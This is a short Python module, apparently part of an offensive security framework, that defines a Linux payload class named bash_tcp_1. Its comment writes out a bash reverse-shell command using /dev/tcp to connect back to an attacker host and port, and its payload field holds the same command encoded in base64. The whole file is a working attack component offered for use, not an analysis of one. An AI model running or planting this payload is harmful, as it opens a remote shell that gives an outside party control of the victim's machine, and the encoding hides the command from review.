from lib.framework.core.payload import Payload


# bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1
class bash_tcp_1(Payload):
    name = "bash_tcp_1"
    platform = ["linux"]
    payload = "YmFzaCAtaSA+JiAvZGV2L3RjcC97TEhPU1R9L3tMUE9SVH0gMD4mMQ=="
